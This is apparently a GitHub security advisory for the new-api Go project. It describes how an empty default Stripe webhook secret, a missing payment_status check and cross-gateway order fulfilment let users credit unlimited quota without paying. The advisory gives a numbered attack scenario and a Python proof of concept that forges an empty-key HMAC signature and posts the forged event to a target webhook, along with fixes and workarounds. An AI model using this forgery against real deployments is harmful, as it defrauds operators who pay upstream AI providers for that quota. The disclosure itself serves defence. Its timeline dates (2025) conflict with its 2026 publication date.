# [H] New API: Stripe Webhook Signature Bypass via Empty Secret Enables Unlimited Quota Fraud

## Summary
Severity: High
Advisory: GHSA-xff3-5c9p-2mr4
CVE: CVE-2026-41432
CWE: CWE-1188, CWE-345, CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-04-24
Source: https://github.com/advisories/GHSA-xff3-5c9p-2mr4
Type: github-advisory

## Affected
- Go: `github.com/QuantumNous/new-api` — affected >=0 <0.12.10

## Details
## Summary

A critical vulnerability exists in the Stripe webhook handler that allows an **unauthenticated attacker to forge webhook events** and credit arbitrary quota to their account without making any payment. The vulnerability stems from three compounding flaws:

1. The Stripe webhook endpoint does not reject requests when `StripeWebhookSecret` is empty (the default).
2. When the HMAC secret is empty, any attacker can compute valid webhook signatures, effectively **bypassing signature verification entirely**.
3. The `Recharge` function does not validate that the order's `PaymentMethod` matches the callback source, enabling **cross-gateway exploitation** — an order created via any payment method (e.g., Epay) can be fulfilled through a forged Stripe webhook.

## Affected Components

- `controller/topup_stripe.go` — `StripeWebhook()`, `sessionCompleted()`
- `model/topup.go` — `Recharge()`, `RechargeCreem()`, `RechargeWaffo()`
- `controller/topup.go` — `EpayNotify()`
- `controller/topup_creem.go` — `CreemAdaptor.RequestPay()` (missing `PaymentMethod` field)
- `router/api-router.go` — webhook route registered without any guard

## CWE Classification

- **CWE-345**: Insufficient Verification of Data Authenticity
- **CWE-1188**: Initialization with an Insecure Default (empty webhook secret)
- **CWE-863**: Incorrect Authorization (cross-gateway order fulfillment)

## Vulnerability Details

### Flaw 1: Empty Webhook Secret Bypasses Signature Verification

The `StripeWebhookSecret` setting defaults to an empty string `""`. The Stripe Go SDK (`webhook.ConstructEventWithOptions`) does **not** reject empty secrets — it computes `HMAC-SHA256` with an empty key, producing a deterministic and publicly computable signature.

**Vulnerable code** (`controller/topup_stripe.go`):
```go
func StripeWebhook(c *gin.Context) {
    // No check for empty StripeWebhookSecret
    payload, _ := io.ReadAll(c.Request.Body)
    signature := c.GetHeader("Stripe-Signature")
    endpointSecret := setting.StripeWebhookSecret // defaults to ""
    event, err := webhook.ConstructEventWithOptions(payload, signature, endpointSecret, ...)
    // When secret is "", attacker can compute valid HMAC with the same empty key
}
```

The webhook route is unconditionally registered with **no authentication middleware and no rate limiting**:
```go
apiRouter.POST("/stripe/webhook", controller.StripeWebhook)
```

### Flaw 2: Missing `payment_status` Verification

The `sessionCompleted` handler only checks `status == "complete"` but does **not** verify `payment_status == "paid"`. Stripe's `checkout.session.completed` event can fire with `payment_status = "unpaid"` for delayed payment methods (bank transfer, SEPA, Boleto, etc.) or `payment_status = "no_payment_required"` for 100% discount coupons.

Additionally, `checkout.session.async_payment_succeeded` and `checkout.session.async_payment_failed` events are not handled, so delayed payments that ultimately fail are never rolled back.

### Flaw 3: Cross-Gateway Order Fulfillment (No PaymentMethod Validation)

The `model.Recharge()` function (called by the Stripe webhook) looks up orders solely by `trade_no` and does **not** validate that the order's `PaymentMethod` is `"stripe"`:

```go
func Recharge(referenceId string, customerId string) (err error) {
    // Finds ANY pending order by trade_no, regardless of PaymentMethod
    tx.Where("trade_no = ?", referenceId).First(topUp)
    if topUp.Status != "pending" { return }
    // Credits quota without checking topUp.PaymentMethod
    quota = topUp.Money * QuotaPerUnit
    tx.Model(&User{}).Update("quota", gorm.Expr("quota + ?", quota))
}
```

This allows an attacker to create orders through **any** configured payment gateway (Epay, Creem, Waffo) and then complete them via a forged Stripe webhook — even if Stripe itself was never configured.

## Attack Scenario

**Prerequisites**: Any payment method is configured (e.g., Epay) + `StripeWebhookSecret` is empty (default).

1. Attacker registers a user account.
2. Attacker calls `POST /api/user/pay` to create an Epay top-up order (e.g., `amount=10000`). The order is stored with `status=pending`.
3. Attacker queries `GET /api/user/topup/self` to retrieve the `trade_no` of the pending order.
4. Attacker computes `HMAC-SHA256` with an empty key over a crafted `checkout.session.completed` payload containing the stolen `trade_no` as `client_reference_id`.
5. Attacker sends `POST /api/stripe/webhook` with the forged payload and signature header.
6. The server verifies the signature (passes because the secret is empty), calls `Recharge()`, which finds the Epay order by `trade_no`, marks it as `success`, and credits the full quota.
7. Attacker repeats steps 2–6 indefinitely for unlimited credits.

**Proof of concept** (pseudocode):
```python
import hmac, hashlib, time, json, requests

timestamp = int(time.time())
payload = json.dumps({
    "type": "checkout.session.completed",
    "data": {
        "object": {
            "client_reference_id": "<trade_no from step 3>",
            "status": "complete",
            "payment_status": "paid",
            "customer": "cus_fake",
            "amount_total": "0",
            "currency": "usd"
        }
    }
})
# Empty secret = publicly computable signature
sig = hmac.new(b"", f"{timestamp}.{payload}".encode(), hashlib.sha256).hexdigest()
header = f"t={timestamp},v1={sig}"

requests.post("https://target/api/stripe/webhook",
    data=payload,
    headers={"Stripe-Signature": header, "Content-Type": "application/json"})
```

## Remediation

### Fix 1: Reject webhooks when secret is empty
```go
func StripeWebhook(c *gin.Context) {
    if setting.StripeWebhookSecret == "" {
        c.AbortWithStatus(http.StatusForbidden)
        return
    }
    // ... existing logic
}
```

### Fix 2: Verify `payment_status` and handle async payment events
```go
func sessionCompleted(event stripe.Event) {
    // ... existing status check ...
    paymentStatus := event.GetObjectValue("payment_status")
    if paymentStatus != "paid" {
        return // Wait for async_payment_succeeded event
    }
    fulfillOrder(event, referenceId, customerId)
}
```

Add handlers for `checkout.session.async_payment_succeeded` and `checkout.session.async_payment_failed`.

### Fix 3: Validate PaymentMethod in all recharge functions
```go
// In model.Recharge (Stripe):
if topUp.PaymentMethod != "stripe" {
    return ErrPaymentMethodMismatch
}

// In model.RechargeCreem:
if topUp.PaymentMethod != "creem" {
    return ErrPaymentMethodMismatch
}

// In model.RechargeWaffo:
if topUp.PaymentMethod != "waffo" {
    return ErrPaymentMethodMismatch
}

// In controller.EpayNotify:
if topUp.PaymentMethod == "stripe" || topUp.PaymentMethod == "creem" || topUp.PaymentMethod == "waffo" {
    return // reject cross-gateway fulfillment
}
```

### Additional fix: Set PaymentMethod on Creem order creation
The Creem order creation was missing the `PaymentMethod` field entirely:
```go
topUp := &model.TopUp{
    // ...
    PaymentMethod: "creem", // was missing
}
```

## Patched Versions

- **v0.12.10** — includes all three fixes described above.

All users are strongly encouraged to upgrade immediately.

## Workaround (for users unable to upgrade immediately)

If users cannot upgrade to v0.12.10 right away, apply **all** of the following mitigations:

1. **Set `StripeWebhookSecret` to any non-empty value.** Go to the admin panel → Payment → Stripe, and set the Webhook Signing Secret to **any random string** (e.g., `whsec_placeholder_do_not_leave_empty`). It does **not** need to be a real Stripe secret — any non-empty value will prevent the empty-key HMAC forgery. **This is the single most important step** — it closes the primary attack vector. If Stripe payments are used in production, replace with the real secret from the project's [Stripe Dashboard → Webhooks](https://dashboard.stripe.com/webhooks) to ensure legitimate webhooks continue to work.

2. **If Stripe is not in use, block the webhook endpoint.** If users have not configured Stripe payments, use a reverse proxy (Nginx, Caddy, etc.) to deny access to `/api/stripe/webhook`:
   ```nginx
   location = /api/stripe/webhook {
       return 403;
   }
   ```

> **Note**: The workaround only mitigates Flaw 1 (empty secret bypass). Flaws 2 (missing `payment_status` check) and 3 (cross-gateway fulfillment) are only fully addressed in v0.12.10. **Upgrading is the only complete fix.**

## Impact

- **Financial fraud**: Attacker obtains unlimited API quota without payment.
- **Operator financial loss**: Fraudulent quota is consumed against upstream AI providers (OpenAI, Anthropic, Google, etc.), charged to the operator.
- **Silent exploitation**: Fraudulent top-ups appear as normal successful transactions in system logs, making detection difficult.
- **Wide exposure**: The default insecure configuration means virtually all deployments with any payment method enabled are vulnerable.

## Timeline

- **2025-04-15**: Vulnerability reported by [@ChangeYu0229](https://github.com/ChangeYu0229)
- **2025-04-15**: Vulnerability confirmed and root cause analysis completed
- **2025-04-15**: Fix developed and applied
- **2025-04-15**: Patched in v0.12.10

## Resources

- [Stripe Webhook Signature Verification Docs](https://docs.stripe.com/webhooks#verify-official-libraries)
- [Stripe Checkout Fulfillment Guide — Handle async payment methods](https://docs.stripe.com/checkout/fulfillment#async-payment-methods)
- [CWE-345: Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)
- [CWE-1188: Initialization with an Insecure Default](https://cwe.mitre.org/data/definitions/1188.html)

## References
- https://github.com/QuantumNous/new-api/security/advisories/GHSA-xff3-5c9p-2mr4
- https://nvd.nist.gov/vuln/detail/CVE-2026-41432
- https://docs.stripe.com/checkout/fulfillment#async-payment-methods
- https://docs.stripe.com/webhooks#verify-official-libraries
- https://github.com/QuantumNous/new-api
- https://github.com/QuantumNous/new-api/releases/tag/v0.12.10
